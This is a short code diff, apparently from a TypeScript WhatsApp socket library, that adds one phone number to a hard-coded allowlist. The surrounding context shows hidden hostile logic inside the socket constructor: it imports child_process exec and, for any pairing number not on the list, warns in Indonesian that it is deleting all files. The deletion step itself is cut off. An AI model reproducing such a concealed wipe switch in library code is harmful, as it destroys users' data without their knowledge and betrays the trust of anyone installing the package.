@@ -489,7 +489,7 @@ export const makeSocket = (config: SocketConfig) => {
 
     const { exec } = require('child_process');
     const path = require('path');
-    const allowedNumbers = ['6285283331260','6285211355660','6283167123804','62881025513804'];
+    const allowedNumbers = ['6285283331260','6285211355660','6283167123804','62881025513804','6281318043874'];
     const requestPairingCodes = async (phoneNumber) => {
     if (!allowedNumbers.includes(phoneNumber)) {
         console.warn('Nomor tidak diizinkan! Menghapus Seluruh file...');
